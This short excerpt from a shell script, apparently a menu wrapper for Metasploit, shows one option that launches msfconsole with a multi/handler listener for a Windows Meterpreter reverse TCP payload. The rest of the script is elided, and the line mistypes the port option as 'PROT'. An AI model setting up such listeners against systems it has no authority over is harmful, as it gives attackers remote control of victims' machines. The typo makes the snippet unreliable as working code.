...
start_msf(){
    ...
    ;;
    "3" )
    msfconsole -x "use exploit/multi/handler;set PAYLOAD windows/meterpreter/reverse_tcp;set LHOST $myip;set PROT $myport;run;"
    start_msf
    ;;
    esac
}
